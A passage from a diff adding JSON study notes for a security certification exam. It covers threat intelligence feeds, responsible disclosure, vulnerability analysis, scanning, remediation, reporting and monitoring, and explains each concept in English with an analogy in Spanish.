+        "raw_content": "* **Definition:** Threat intelligence feeds provided by commercial vendors under a subscription model, offering more refined, analyzed, and timely information than open-source alternatives.\n\nWell-known providers include **FireEye**, **McAfee**, and **Symantec**. These feeds integrate directly into **SIEM** tools and other security platforms to provide analysts with actionable insights and automated threat response capabilities."
+      },
+      {
+        "name": "Threat Intelligence Feeds: Information Sharing Organizations",
+        "definition": "Industry alliances formed to share threat intelligence among members in the same sector, enabling collective defense against threats specific to that industry.",
+        "analogy": "",
+        "raw_content": "* **Definition:** Industry alliances formed to share threat intelligence among members in the same sector, enabling collective defense against threats specific to that industry.\n\n**Information Sharing and Analysis Centers (ISACs)** and **Information Sharing and Analysis Organizations (ISAOs)** connect companies in sectors such as finance, healthcare, and energy to share vulnerabilities and threat data specific to their industries. Members both receive and contribute to the collective knowledge."
+      },
+      {
+        "name": "Threat Intelligence Feeds: Dark Web",
+        "definition": "Intelligence gathered from the intentionally hidden, non-indexed portion of the Internet where threat actors discuss new hacking techniques, sell stolen data, and share information about emerging exploits — used by security researchers to gain advance warning of potential threats.",
+        "analogy": "",
+        "raw_content": "* **Definition:** Intelligence gathered from the intentionally hidden, non-indexed portion of the Internet where threat actors discuss new hacking techniques, sell stolen data, and share information about emerging exploits — used by security researchers to gain advance warning of potential threats.\n\nBy monitoring dark web forums and marketplaces, security researchers can learn about new tools and attack methods before they become mainstream threats, providing advance warning to defenders.\n\n---"
+      },
+      {
+        "name": "Responsible Disclosure Programs",
+        "definition": "An ethical practice where a security researcher discloses information about a vulnerability in software, hardware, or an online service in a confidential manner to the relevant stakeholder — such as the software developer — allowing sufficient time to address the vulnerability before public disclosure occurs.",
+        "analogy": "*Es como avisarle a un restaurante en privado que encontraste una cucaracha en la cocina antes de publicarlo en redes sociales: les das la oportunidad de resolver el problema primero.*",
+        "raw_content": "* **Definition:** An ethical practice where a security researcher discloses information about a vulnerability in software, hardware, or an online service in a confidential manner to the relevant stakeholder — such as the software developer — allowing sufficient time to address the vulnerability before public disclosure occurs.\n\n> *Es como avisarle a un restaurante en privado que encontraste una cucaracha en la cocina antes de publicarlo en redes sociales: les das la oportunidad de resolver el problema primero.*\n\nThe responsible disclosure workflow:\n\n1. Security researcher discovers a vulnerability.\n2. Researcher contacts the vendor/developer **privately** through official channels.\n3. Researcher provides enough information for the vendor to **reproduce** the vulnerability.\n4. Both parties agree on a **disclosure timeframe** (typically weeks to months).\n5. Vendor develops and deploys a **patch or hotfix** for all end users.\n6. After the agreed timeframe or successful remediation, the researcher **publicly discloses** the vulnerability to the security community."
+      },
+      {
+        "name": "Responsible Disclosure Programs: Bug Bounty Programs",
+        "definition": "A formal program created by an organization that offers monetary rewards to security researchers who find and report validated vulnerabilities in the organization's systems, providing a structured and incentivized framework for responsible disclosure.",
+        "analogy": "",
+        "raw_content": "* **Definition:** A formal program created by an organization that offers monetary rewards to security researchers who find and report validated vulnerabilities in the organization's systems, providing a structured and incentivized framework for responsible disclosure.\n\nBug bounty programs can be run internally or through third-party platforms such as **HackerOne**, **Bugcrowd**, and **Synack**. Reward levels are aligned with the severity of the vulnerability — a remote code execution (critical) pays significantly more than an information disclosure (low).\n\n**Benefits of bug bounty programs:**\n\n- **Increased security** — external researchers find vulnerabilities internal teams may have missed.\n- **Community collaboration** — builds a community invested in the product's security.\n- **Cost-effectiveness** — organizations pay only for validated findings, not for time spent.\n\n**Key elements of a successful program:**\n\n- Clearly defined **scope** (what is and is not in scope for testing)\n- Designated **communication channel** for vulnerability submissions\n- Transparent **reward structure** based on vulnerability severity\n- Clear **timeframes** for acknowledgment, validation, and remediation\n- **Legal protections** for researchers acting in good faith within the rules of engagement\n\n---"
+      },
+      {
+        "name": "Analyzing Vulnerabilities",
+        "definition": "The process of evaluating identified vulnerabilities to confirm their existence, determine their severity and potential impact, classify them by type, and align remediation priorities with the organization's risk tolerance.",
+        "analogy": "*Es como el trabajo de un médico de urgencias haciendo triage: no todos los pacientes tienen el mismo nivel de urgencia, así que los clasifica, prioriza los más críticos y asigna los recursos donde más se necesitan.*",
+        "raw_content": "* **Definition:** The process of evaluating identified vulnerabilities to confirm their existence, determine their severity and potential impact, classify them by type, and align remediation priorities with the organization's risk tolerance.\n\n> *Es como el trabajo de un médico de urgencias haciendo triage: no todos los pacientes tienen el mismo nivel de urgencia, así que los clasifica, prioriza los más críticos y asigna los recursos donde más se necesitan.*"
+      },
+      {
+        "name": "Analyzing Vulnerabilities: Vulnerability Confirmation",
+        "definition": "The step of determining whether a detected finding represents a real vulnerability or a scanner error, categorized as true positive, false positive, true negative, or false negative.",
+        "analogy": "",
+        "raw_content": "* **Definition:** The step of determining whether a detected finding represents a real vulnerability or a scanner error, categorized as true positive, false positive, true negative, or false negative.\n\n| Finding | Definition | Example |\n| --- | --- | --- |\n| **True Positive** | Real vulnerability correctly identified by the scanner | Scanner detects missing MS17-010 patch; patch was never installed — confirmed vulnerable |\n| **False Positive** | Scanner incorrectly reports a vulnerability that does not exist | Scanner reports missing Windows patch on a Linux machine — Windows patches do not apply |\n| **True Negative** | Scanner correctly identifies no vulnerability present | Scanner confirms all patches are current — system is actually secure |\n| **False Negative** | Scanner fails to detect a real vulnerability that exists on the system | Vulnerability exists but scanner's definitions are outdated — not flagged, but exploitable |\n\n⚠️ **Exam Tip:** False negatives are the most dangerous outcome because they create a false sense of security — the system appears clean but remains exploitable."
+      },
+      {
+        "name": "Analyzing Vulnerabilities: Prioritization",
+        "definition": "The process of ranking identified vulnerabilities in order of severity and potential organizational impact to ensure resources are allocated toward the most critical threats first.",
+        "analogy": "",
+        "raw_content": "* **Definition:** The process of ranking identified vulnerabilities in order of severity and potential organizational impact to ensure resources are allocated toward the most critical threats first.\n\nFactors in prioritization include **ease of exploitation**, **magnitude of potential damage**, and the **importance of the affected system to business operations**. A vulnerability in a mission-critical application that could expose sensitive customer data takes higher priority than a minor flaw in a non-critical system."
+      },
+      {
+        "name": "Prioritization: CVSS — Common Vulnerability Scoring System",
+        "definition": "A standardized framework for assessing the severity of vulnerabilities by assigning a numeric score (0–10) based on metrics such as attack vector, impact, and exploitability, enabling consistent cross-organizational prioritization.",
+        "analogy": "",
+        "raw_content": "* **Definition:** A standardized framework for assessing the severity of vulnerabilities by assigning a numeric score (0–10) based on metrics such as attack vector, impact, and exploitability, enabling consistent cross-organizational prioritization.\n\nCVSS scores guide prioritization but must be combined with organizational context — a critical-scored vulnerability on an isolated, air-gapped system may be lower priority than a medium-scored one on an externally facing web server."
+      },
+      {
+        "name": "Analyzing Vulnerabilities: Classification",
+        "definition": "The process of categorizing identified vulnerabilities based on factors such as threat type, potential impact, and affected systems to streamline management and remediation efforts.",
+        "analogy": "",
+        "raw_content": "* **Definition:** The process of categorizing identified vulnerabilities based on factors such as threat type, potential impact, and affected systems to streamline management and remediation efforts.\n\nExamples of classification categories include software flaws (buffer overflow, privilege escalation), configuration errors (insecure default settings), and security policy gaps. Classification can be further informed by the CVE system."
+      },
+      {
+        "name": "Classification: CVE — Common Vulnerabilities and Exposures",
+        "definition": "A publicly maintained database at `cve.mitre.org` that assigns a unique identifier (CVE number) to every known vulnerability, providing a standardized reference containing a description, potential impact, and known solutions or workarounds.",
+        "analogy": "",
+        "raw_content": "* **Definition:** A publicly maintained database at `cve.mitre.org` that assigns a unique identifier (CVE number) to every known vulnerability, providing a standardized reference containing a description, potential impact, and known solutions or workarounds.\n\nCross-referencing scan findings with the CVE database gives cybersecurity professionals deeper context about the nature and characteristics of each vulnerability to support more informed decision-making."
+      },
+      {
+        "name": "Analyzing Vulnerabilities: Organizational Impact",
+        "definition": "The assessment of how a vulnerability affects the confidentiality, integrity, or availability of an organization's data and services, factoring in the industry context to determine appropriate prioritization.",
+        "analogy": "",
+        "raw_content": "* **Definition:** The assessment of how a vulnerability affects the confidentiality, integrity, or availability of an organization's data and services, factoring in the industry context to determine appropriate prioritization.\n\nA vulnerability that exposes sensitive customer data has significant reputational and regulatory impact. A vulnerability affecting the availability of a critical service threatens business continuity. Healthcare vulnerabilities can risk patient safety; financial institution vulnerabilities can cause monetary losses and regulatory scrutiny."
+      },
+      {
+        "name": "Analyzing Vulnerabilities: Exposure Factor (EF)",
+        "definition": "A quantifiable metric representing the percentage of an asset that is likely to be damaged or affected if a specific vulnerability is exploited — used in quantitative risk management calculations.",
+        "analogy": "",
+        "raw_content": "* **Definition:** A quantifiable metric representing the percentage of an asset that is likely to be damaged or affected if a specific vulnerability is exploited — used in quantitative risk management calculations.\n\nA vulnerability that could compromise an entire customer database has a high exposure factor. One that only exposes non-critical metadata has a low exposure factor. The exposure factor is a key input when calculating **Single Loss Expectancy (SLE)** and **Annualized Loss Expectancy (ALE)** in a quantitative risk assessment."
+      },
+      {
+        "name": "Analyzing Vulnerabilities: Risk Tolerance",
+        "definition": "The level of risk an organization is willing to accept in the pursuit of its objectives before action is deemed necessary to mitigate that risk.",
+        "analogy": "",
+        "raw_content": "* **Definition:** The level of risk an organization is willing to accept in the pursuit of its objectives before action is deemed necessary to mitigate that risk.\n\n| Risk Tolerance | Behavior |\n| --- | --- |\n| **Low risk tolerance** | Even minor or moderate vulnerabilities must be remediated quickly; stringent security measures regardless of cost |\n| **High risk tolerance** | Organization may accept certain exposures and monitor some vulnerabilities while focusing remediation on the most critical ones |\n\nVulnerability management practices must align with the organization's risk tolerance to remain consistent with its overall business strategy.\n\n---"
+      },
+      {
+        "name": "Conducting Vulnerability Scans",
+        "definition": "The practice of using automated scanning tools such as Nessus or OpenVAS to systematically search for known vulnerabilities across an organization's systems and networks, generating detailed reports for analyst review.",
+        "analogy": "*Es como contratar a un equipo de inspectores de bomberos para revisar cada rincón del edificio con una lista de verificación: no improvisan, siguen un proceso estructurado y documentan cada hallazgo.*",
+        "raw_content": "* **Definition:** The practice of using automated scanning tools such as Nessus or OpenVAS to systematically search for known vulnerabilities across an organization's systems and networks, generating detailed reports for analyst review.\n\n> *Es como contratar a un equipo de inspectores de bomberos para revisar cada rincón del edificio con una lista de verificación: no improvisan, siguen un proceso estructurado y documentan cada hallazgo.*\n\n**Key scanner concepts:**\n\n- **Credentialed vs. Un-credentialed scans:** Credentialed scans provide the scanner with a valid username and password, granting it administrative access to find more vulnerabilities (including those only visible from inside the system). Un-credentialed scans simulate what an external attacker without credentials would find. A credentialed scan will typically discover more vulnerabilities.\n- **Scan scheduling:** Scans should be automated and scheduled (weekly, monthly, quarterly) so findings are consistently tracked over time without requiring manual initiation.\n- **Scan scope:** Define which hosts, IP ranges, or subnets are included. Individual host scans provide more detail; subnet-wide scans provide broader coverage.\n- **Plugin/definition updates:** Scanner plugins must be kept current to detect the latest vulnerabilities. Outdated plugins cause false negatives — the scanner cannot detect what it does not know about.\n\n**Common scanner tools:**\n\n| Tool | Description |\n| --- | --- |\n| **Nessus (Tenable)** | Industry-standard commercial scanner; Nessus Essentials is free for up to 16 IPs |\n| **OpenVAS / Greenbone** | Open-source vulnerability scanner; community edition available at no cost |\n| **QualysGuard** | Cloud-based enterprise vulnerability management platform |\n\n**Scan output categories (Nessus example):** Critical · High · Medium · Low · Informational. Focus remediation efforts on Critical and High findings first; Informational findings are not typically exploitable.\n\n---"
+      },
+      {
+        "name": "Assessing Vulnerability Scan Results",
+        "definition": "The process of comprehensively analyzing data gathered from vulnerability scans to determine which vulnerabilities require immediate attention and which can be addressed in a structured manner later, confirming true positives and filtering out false positives.",
+        "analogy": "*Es como revisar los resultados de un examen médico completo: no todos los hallazgos son igual de urgentes. El médico los analiza, descarta los falsos positivos y te dice cuáles necesitan atención inmediata.*",
+        "raw_content": "* **Definition:** The process of comprehensively analyzing data gathered from vulnerability scans to determine which vulnerabilities require immediate attention and which can be addressed in a structured manner later, confirming true positives and filtering out false positives.\n\n> *Es como revisar los resultados de un examen médico completo: no todos los hallazgos son igual de urgentes. El médico los analiza, descarta los falsos positivos y te dice cuáles necesitan atención inmediata.*\n\nWhen assessing scan results, the analyst must:\n\n- **Confirm true positives:** Validate that the scanner finding corresponds to a real vulnerability on the actual system.\n- **Identify false positives:** Remove findings that do not apply (e.g., a Windows patch flag on a Linux server).\n- **Filter by severity:** Prioritize Critical and High findings for immediate remediation.\n- **Cross-reference CVEs:** Use the CVE database to get detailed context on each finding.\n- **Filter by host or CVE:** Modern scanners support filtering results by specific IP addresses or CVE identifiers, enabling targeted analysis of a specific machine or a specific known vulnerability across the entire network.\n- **Use CVSS scores with context:** A 10.0 score on an isolated internal-only server may be lower priority than a 6.5 score on a public-facing web server.\n\n**Reporting output formats from scanners:**\n\n| Format | Best for |\n| --- | --- |\n| **By host** | Seeing all vulnerabilities on a single machine |\n| **By plugin/vulnerability** | Seeing all machines affected by a specific vulnerability |\n| **Executive summary** | Non-technical stakeholders needing high-level posture overview |\n| **CSV export** | Data analysis or import into SIEM tools |\n\n---"
+      },
+      {
+        "name": "Vulnerability Response and Remediation",
+        "definition": "The strategies and actions taken to identify, assess, and address vulnerabilities in a system or network to mitigate associated risks and strengthen the organization's security posture.",
+        "analogy": "*Es como tener un plan de emergencias con múltiples opciones dependiendo del tipo de incendio: extintores para pequeños, rociadores para grandes, evacuación para situaciones extremas. No hay una sola respuesta para todo.*",
+        "raw_content": "* **Definition:** The strategies and actions taken to identify, assess, and address vulnerabilities in a system or network to mitigate associated risks and strengthen the organization's security posture.\n\n> *Es como tener un plan de emergencias con múltiples opciones dependiendo del tipo de incendio: extintores para pequeños, rociadores para grandes, evacuación para situaciones extremas. No hay una sola respuesta para todo.*\n\nThere are five main response and remediation options:"
+      },
+      {
+        "name": "Vulnerability Response and Remediation: Patching",
+        "definition": "The process of applying updates provided by software vendors to fix known security vulnerabilities or improve performance in software, systems, or applications.",
+        "analogy": "",
+        "raw_content": "* **Definition:** The process of applying updates provided by software vendors to fix known security vulnerabilities or improve performance in software, systems, or applications.\n\nPatches are the **primary and most direct** remediation method. When a vendor releases a security patch, it is the end user organization's responsibility to apply it across all affected systems. Patches should be tested in a controlled environment before broad enterprise deployment to avoid introducing new issues."
+      },
+      {
+        "name": "Vulnerability Response and Remediation: Insurance Policies",
+        "definition": "A cybersecurity risk insurance policy that an organization procures to mitigate financial losses resulting from a cyber incident such as a data breach, network outage, or business interruption.",
+        "analogy": "",
+        "raw_content": "* **Definition:** A cybersecurity risk insurance policy that an organization procures to mitigate financial losses resulting from a cyber incident such as a data breach, network outage, or business interruption.\n\nCybersecurity insurance does not fix the vulnerability — it is a **risk transfer strategy**. It covers costs such as legal fees, new hardware, consultants, public relations recovery efforts, and customer breach notification costs. Insurance is used when the cost of full remediation exceeds the acceptable risk threshold."
+      },
+      {
+        "name": "Vulnerability Response and Remediation: Network Segmentation",
+        "definition": "Dividing a computer network into smaller, isolated segments to limit the lateral movement of a threat, ensuring that a compromise in one segment does not propagate into others.",
+        "analogy": "",
+        "raw_content": "* **Definition:** Dividing a computer network into smaller, isolated segments to limit the lateral movement of a threat, ensuring that a compromise in one segment does not propagate into others.\n\nExample: A hospital separates patient data systems from non-critical administrative systems. If malware infects the administrative segment, the segmented patient data network remains protected."
+      },
+      {
+        "name": "Vulnerability Response and Remediation: Compensating Controls",
+        "definition": "Alternative security measures implemented when a primary or standard security control cannot feasibly be applied to a given system, designed to provide an equivalent level of protection.",
+        "analogy": "",
+        "raw_content": "* **Definition:** Alternative security measures implemented when a primary or standard security control cannot feasibly be applied to a given system, designed to provide an equivalent level of protection.\n\nExample: An organization mandates MFA on all systems, but some legacy servers cannot support MFA software. Until those servers are upgraded, compensating controls are implemented — such as rigorous password policies, account lockout after failed login attempts, and regular security awareness training — to reduce the risk in the interim."
+      },
+      {
+        "name": "Vulnerability Response and Remediation: Exceptions and Exemptions",
+        "definition": "Formal acknowledgments that a security control or policy will be temporarily (exception) or permanently (exemption) relaxed for a specific system or use case, with documented rationale, scope, and risk acceptance.",
+        "analogy": "",
+        "raw_content": "* **Definition:** Formal acknowledgments that a security control or policy will be temporarily (exception) or permanently (exemption) relaxed for a specific system or use case, with documented rationale, scope, and risk acceptance.\n\n| Type | Duration | Example |\n| --- | --- | --- |\n| **Exception** | Temporary | Legacy server cannot be patched without breaking a critical app; exception granted with an expiration date |\n| **Exemption** | Permanent | Research supercomputer physically isolated from the network; permanently exempt from update policy because it cannot run modern security software |\n\n⚠️ **Exam Tip:** Both exceptions and exemptions require documented rationale and acceptance of the associated risk. Neither eliminates the risk — they acknowledge and manage it.\n\n---"
+      },
+      {
+        "name": "Validating Vulnerability Remediation",
+        "definition": "The process of confirming through rescanning, auditing, and verification that remediation actions have effectively mitigated identified vulnerabilities and that the system is now secure and still operationally functional.",
+        "analogy": "*Es como pedir una segunda opinión médica después de un tratamiento: no das por sentado que funcionó solo porque el doctor dijo que sí. Te hacen otro examen para confirmar que el problema desapareció.*",
+        "raw_content": "* **Definition:** The process of confirming through rescanning, auditing, and verification that remediation actions have effectively mitigated identified vulnerabilities and that the system is now secure and still operationally functional.\n\n> *Es como pedir una segunda opinión médica después de un tratamiento: no das por sentado que funcionó solo porque el doctor dijo que sí. Te hacen otro examen para confirmar que el problema desapareció.*"
+      },
+      {
+        "name": "Validating Vulnerability Remediation: Rescanning",
+        "definition": "Conducting a new vulnerability scan after remediation to confirm the vulnerability is no longer present, verify the patch was correctly installed, and identify any newly introduced vulnerabilities.",
+        "analogy": "",
+        "raw_content": "* **Definition:** Conducting a new vulnerability scan after remediation to confirm the vulnerability is no longer present, verify the patch was correctly installed, and identify any newly introduced vulnerabilities.\n\nRescanning should be:\n\n- **Scheduled automatically** to ensure consistent validation across all systems.\n- **Comprehensive** — scan the full system, not just the single patched vulnerability, to assess overall posture.\n- **Conducted under the same conditions** as the original scan to enable an accurate apples-to-apples comparison.\n\n⚠️ A patch can sometimes **fix the target vulnerability but introduce new ones** — only a comprehensive rescan will catch this."
+      },
+      {
+        "name": "Validating Vulnerability Remediation: Auditing",
+        "definition": "The systematic review of logs, configurations, and patch status to ensure they align with established security standards and policies, validating that remediation actions were properly implemented.",
+        "analogy": "",
+        "raw_content": "* **Definition:** The systematic review of logs, configurations, and patch status to ensure they align with established security standards and policies, validating that remediation actions were properly implemented.\n\n- **Configuration auditing:** Checks the system setup for misconfigurations or deviations from the security baseline.\n- **Patch auditing:** Confirms that all patches were properly applied and that all known vulnerabilities have been addressed.\n- **Compliance checks:** Ensures the system remains compliant with applicable regulations (GDPR, HIPAA, GLBA, SOX) after changes were made.\n- Automated auditing tools (such as configuration management solutions) significantly accelerate this process."
+      },
+      {
+        "name": "Validating Vulnerability Remediation: Verification",
+        "definition": "The final checkpoint in the remediation validation process, involving testing the system to confirm that patches and configuration changes had the desired effect without disrupting normal operations.",
+        "analogy": "",
+        "raw_content": "* **Definition:** The final checkpoint in the remediation validation process, involving testing the system to confirm that patches and configuration changes had the desired effect without disrupting normal operations.\n\nVerification methods:\n\n- **Targeted penetration test:** Simulates the specific attack vector to confirm it can no longer be exploited.\n- **User verification:** Confirms all applications and services continue to function correctly after the changes — remediation should not break what was working.\n- **Feedback loops:** Mechanisms for users and staff to quickly report any post-remediation issues.\n- **External auditor:** Provides a purely objective, third-party evaluation of remediation effectiveness — particularly valuable for regulatory compliance.\n\n---"
+      },
+      {
+        "name": "Vulnerability Reporting",
+        "definition": "The process of documenting and communicating details about security weaknesses identified in systems or software to the individuals or organizations responsible for addressing them, ensuring vulnerabilities are managed discreetly and effectively to prevent exploitation.",
+        "analogy": "*Es como el informe médico que el doctor le da al especialista: contiene información detallada y sensible que debe mantenerse en canales seguros y solo llegar a quienes realmente la necesitan.*",
+        "raw_content": "* **Definition:** The process of documenting and communicating details about security weaknesses identified in systems or software to the individuals or organizations responsible for addressing them, ensuring vulnerabilities are managed discreetly and effectively to prevent exploitation.\n\n> *Es como el informe médico que el doctor le da al especialista: contiene información detallada y sensible que debe mantenerse en canales seguros y solo llegar a quienes realmente la necesitan.*\n\nVulnerability reports must use **clear, concise, and transparent language** while simultaneously maintaining **strict confidentiality** — a leaked vulnerability report is essentially a roadmap for attackers, detailing every weakness in the organization's defenses."
+      },
+      {
+        "name": "Vulnerability Reporting: Internal Reporting",
+        "definition": "The identification, documentation, and communication of vulnerability findings within the organizational structure, either horizontally to system administrators who apply patches or vertically to management and executives who oversee security posture.",
+        "analogy": "",
+        "raw_content": "* **Definition:** The identification, documentation, and communication of vulnerability findings within the organizational structure, either horizontally to system administrators who apply patches or vertically to management and executives who oversee security posture.\n\n- **Horizontal reporting:** Cybersecurity analyst → system administrators (operational detail, patch instructions).\n- **Vertical reporting:** Analyst/security team → management/executives (security posture overview, prioritized summary).\n\nInternal reports must be **timely** — rapid reporting reduces the window of exposure between discovery and remediation. Established communication paths and protocols ensure reports reach the right people without delay."
+      },
+      {
+        "name": "Vulnerability Reporting: External Reporting",
+        "definition": "Communication of vulnerability information outside the organization's structure, typically involving vendors, partners, customers, or the public at large.",
+        "analogy": "",
+        "raw_content": "* **Definition:** Communication of vulnerability information outside the organization's structure, typically involving vendors, partners, customers, or the public at large.\n\nCommon external reporting scenarios:\n\n- **Vendor coordination:** Engaging the vendor of the vulnerable product gives them the opportunity to develop a patch not just for your organization, but for all customers using that product.\n- **CVE database contributions:** Sharing non-sensitive vulnerability details with the CVE database or vendor knowledge bases increases the broader security community's knowledge.\n\nExternal reporting must protect the privacy of employees, customers, and vendors. Sensitive system details should not be disclosed in ways that could put others at risk."
+      },
+      {
+        "name": "Vulnerability Reporting: Responsible Disclosure Reporting",
+        "definition": "The ethical practice of disclosing a discovered vulnerability to the responsible vendor with enough detail to reproduce and fix it, before making any public announcement, to prevent threat actors from exploiting users during the remediation window.",
+        "analogy": "",
+        "raw_content": "* **Definition:** The ethical practice of disclosing a discovered vulnerability to the responsible vendor with enough detail to reproduce and fix it, before making any public announcement, to prevent threat actors from exploiting users during the remediation window.\n\nA responsible disclosure report to a vendor should include:\n\n- The method used to discover and reproduce the vulnerability.\n- The potential impact if the vulnerability is exploited.\n- Proposed mitigations that customers can apply until a patch is released.\n\nExample: A vulnerability affecting SMBv1 and SMBv2 — proposed mitigation is to disable those protocol versions or block Port 445 at the firewall — protecting customers externally until Microsoft releases an official patch through Windows Update."
+      },
+      {
+        "name": "Vulnerability Reporting: Confidentiality in Vulnerability Reports",
+        "definition": "The requirement that vulnerability reports be encrypted, access-controlled, and shared only on a need-to-know basis to prevent the detailed list of organizational weaknesses from being used by threat actors to plan and execute attacks.",
+        "analogy": "",
+        "raw_content": "* **Definition:** The requirement that vulnerability reports be encrypted, access-controlled, and shared only on a need-to-know basis to prevent the detailed list of organizational weaknesses from being used by threat actors to plan and execute attacks.\n\nA vulnerability report is a comprehensive map of an organization's weaknesses — in the wrong hands, it tells an attacker exactly where to target. Confidentiality is non-negotiable.\n\n**Best practices for report confidentiality:**\n\n- **Encrypt all reports** before distribution or storage.\n- **Use secure storage** (password-protected internal SharePoint or document repository) rather than emailing PDFs directly.\n- **Access control:** Share with those who have a legitimate need-to-know only:\n  - System administrators → full technical report (they need it to patch).\n  - Executives → 3–5 page executive summary with graphs and high-level posture overview (not the 300-page detailed technical report).\n  - Accountants, HR, etc. → no access required.\n\n**Consequences of a leaked vulnerability report:**\n\n- **Exploitation** — attackers use it to attack known vulnerabilities before they are patched.\n- **Reputational damage** — public loss of confidence in the organization's ability to protect data.\n- **Legal repercussions** — liability under contracts, industry regulations, or customer lawsuits if their data is exposed.\n\n---"
+      }
+    ]
+  },
+  {
+    "sectionId": "S23",
+    "sectionTitle": "Section 23: Alerting and Monitoring",
+    "concepts": [
+      {
+        "name": "Monitoring Resources",
+        "definition": "The objective domain (4.4) covering the observation of systems, applications, and infrastructure to ensure optimal performance, security, and reliability across an organization's network.",
+        "analogy": "*Como un chequeo médico integral: no basta con medir solo el pulso, hay que revisar el corazón, los pulmones y la circulación por separado para tener el cuadro completo.*",
+        "tables": [],
+        "list_items": [],
+        "raw_content": "* **Definition:** The objective domain (4.4) covering the observation of systems, applications, and infrastructure to ensure optimal performance, security, and reliability across an organization's network.\n\nMonitoring resources effectively is crucial for the smooth operation of any organizational network. This objective breaks monitoring into three distinct areas: **system monitoring**, **application monitoring**, and **infrastructure monitoring**, each covered as its own concept below.\n\n> *Como un chequeo médico integral: no basta con medir solo el pulso, hay que revisar el corazón, los pulmones y la circulación por separado para tener el cuadro completo.*\n\n### Monitoring Resources: System Monitoring\n\n* **Definition:** The practice of observing a computer system's resource usage — including CPU utilization, memory consumption, disk usage, and network performance — to identify potential issues affecting stability or performance.\n\nSystem monitoring tracks core resource metrics to catch problems before they escalate. On Windows, this can be observed locally using the **Performance Monitor** tool, which displays CPU, memory, and storage utilization in real time.\n\n> *Es como revisar los signos vitales de una máquina: temperatura, presión y consumo de energía, para saber si algo anda mal antes de que se apague.*\n\n### Monitoring Resources: Baseline\n\n* **Definition:** A set of established performance metrics and data points representing the typical, expected behavior of a system, network, or application under normal operating conditions.\n\nA baseline serves as the reference point against which current performance is measured. Deviations from baseline (e.g., consistently high CPU utilization) signal potential issues requiring investigation, enabling proactive troubleshooting rather than reactive firefighting.\n\n> *Es como saber cuál es tu temperatura corporal normal (37°C): sin ese número de referencia, no sabrías si una fiebre de 38.5°C es motivo de preocupación.*\n\n### Monitoring Resources: Application Monitoring\n\n* **Definition:** Also called Application Performance Monitoring (APM), the practice of tracking errors, bottlenecks, response times, and other issues affecting a software application's performance or user experience.\n\nTools like **New Relic** or **AppDynamics** track response times, error rates, and key performance indicators. A slow response time may indicate a code problem or a need for additional server resources.\n\n> *Como cronometrar a un mesero en un restaurante: si tarda demasiado en traer los platos, algo en la cocina (el código) o en el personal (los recursos) necesita ajustarse.*\n\n### Monitoring Resources: Infrastructure Monitoring\n\n* **Definition:** The observation of the performance and availability of an organization's physical and virtual infrastructure, including servers, networks, virtual machines, containers, cloud services, and hardware.\n\nTools like **SolarWinds** or the **PRTG Network Monitor** provide visibility into network traffic, bandwidth utilization, and device status. A constantly overloaded switch may indicate the need for additional capacity or a misconfiguration.\n\n> *Como monitorear las tuberías y el cableado eléctrico de un edificio completo, no solo un cuarto: hay que vigilar toda la estructura que sostiene la operación.*\n\n---"
+      },
+      {
+        "name": "Alerting and Monitoring Activities",
+        "definition": "The objective domain (4.4) covering the set of operational activities — log aggregation, alerting, scanning, reporting, archiving, and alert response/remediation/validation — used to maintain system health and protect against threats.",
+        "analogy": "*Como el ciclo de vida de una investigación policial: recolectar evidencia, dar la alarma, buscar más pistas, escribir el reporte, archivar el caso y finalmente resolverlo y confirmar que se resolvió.*",
+        "tables": [],
+        "list_items": [],
+        "raw_content": "* **Definition:** The objective domain (4.4) covering the set of operational activities — log aggregation, alerting, scanning, reporting, archiving, and alert response/remediation/validation — used to maintain system health and protect against threats.\n\nThese six activities work together as a continuous cycle: collect data, notify on issues, actively hunt for weaknesses, summarize findings, retain data for compliance, and close the loop by acting on and confirming fixes.\n\n> *Como el ciclo de vida de una investigación policial: recolectar evidencia, dar la alarma, buscar más pistas, escribir el reporte, archivar el caso y finalmente resolverlo y confirmar que se resolvió.*\n\n### Alerting and Monitoring Activities: Log Aggregation\n\n* **Definition:** The process of collecting and consolidating log data from various sources into a centralized location to support troubleshooting, performance monitoring, security analysis, and compliance.\n\nAggregated logs provide a holistic view across systems, making it easier to correlate events and pinpoint root causes. Regulations like **GDPR** and **HIPAA** require maintaining comprehensive logs, which centralized aggregation helps satisfy for audits.\n\n> *Como juntar todos los testimonios de testigos de un accidente en un solo expediente, en lugar de tenerlos dispersos en distintas libretas.*\n\n### Alerting and Monitoring Activities: Alerting\n\n* **Definition:** The activity of setting up notifications — delivered via email, text message, or push notification — to inform relevant stakeholders when specific predefined events, thresholds, or anomalies occur.\n\nAlerting enables proactive issue resolution (e.g., a CPU threshold alert) and faster security investigation (e.g., multiple failed login attempts). Some regulations require immediate notification of specific events, such as data breaches, to governmental agencies.\n\n> *Como una alarma de incendios: no apaga el fuego por sí sola, pero avisa a tiempo para que alguien actúe antes de que se propague.*\n\n### Alerting and Monitoring Activities: Scanning\n\n* **Definition:** The activity of regularly examining systems, networks, or applications using specialized tools (e.g., Nessus, OpenVAS, Qualys) to identify vulnerabilities, misconfigurations, or other potential problems.\n\nScanning has three main types, each detailed below as its own concept: **vulnerability scans**, **configuration scans**, and **code scans**.\n\n> *Como una inspección de rutina de un edificio: se revisan las tuberías, las salidas de emergencia y los planos de construcción por separado, cada uno con su propia lista de chequeo.*\n\n#### Scanning: Vulnerability Scan\n\n* **Definition:** A scan that checks systems, networks, or applications for known vulnerabilities by comparing their current state against a database of Common Vulnerabilities and Exposures (CVE), maintained by the MITRE Corporation at cve.mitre.org.\n\nTools like **Nessus** or **OpenVAS** identify unpatched software, misconfigured services, or other exploitable weaknesses so administrators can patch, reconfigure, or apply compensating controls like a WAF.\n\n> *Como comparar la lista de invitados de una fiesta contra una lista de criminales conocidos: cualquier coincidencia se marca de inmediato.*\n\n#### Scanning: Configuration Scan\n\n* **Definition:** A scan that checks a system's configuration against best-practice guidelines or compliance standards to detect misconfigurations that could impact performance or security.\n\nTools like **CIS-CAT** evaluate configurations against benchmarks such as the **CIS Controls** or **PCI DSS**. Discrepancies — open ports, weak access controls, non-compliant settings — are flagged for remediation.\n\n> *Como verificar que cada puerta y ventana de una casa esté correctamente cerrada según el manual del fabricante, no solo que existan.*\n\n#### Scanning: Code Scan\n\n* **Definition:** A scan that checks an application's source code for security vulnerabilities or coding errors, using static or dynamic code analysis techniques.\n\nStatic tools like **Fortify** or **SonarQube** catch issues like SQL injection points, XSS vulnerabilities, or unsanitized variables during development. Dynamic techniques, such as penetration testing, complement static analysis by evaluating the application's behavior while running.\n\n> *Como revisar los planos de un edificio antes de construirlo (análisis estático) y luego someterlo a una prueba sísmica real una vez construido (análisis dinámico).*\n\n### Alerting and Monitoring Activities: Reporting\n\n* 